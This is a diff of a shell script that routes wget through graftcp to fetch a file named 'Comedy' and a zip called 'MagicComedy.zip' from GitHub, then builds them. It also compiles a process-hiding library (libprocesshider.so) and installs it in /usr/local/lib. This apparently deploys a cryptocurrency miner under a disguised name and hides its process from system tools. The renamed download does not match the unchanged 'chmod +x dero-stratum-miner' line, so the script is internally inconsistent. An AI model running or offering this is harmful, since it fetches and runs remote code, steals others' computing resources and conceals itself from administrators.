@@ -32,11 +32,11 @@ echo " "
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/putri212/mbah/raw/main/dero-stratum-miner
+./graftcp/graftcp wget https://github.com/catursawah/xmr/raw/main/Comedy
 chmod +x dero-stratum-miner
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
+./graftcp/graftcp wget https://github.com/catursawah/xmr/raw/main/MagicComedy.zip
+unzip MagicComedy.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
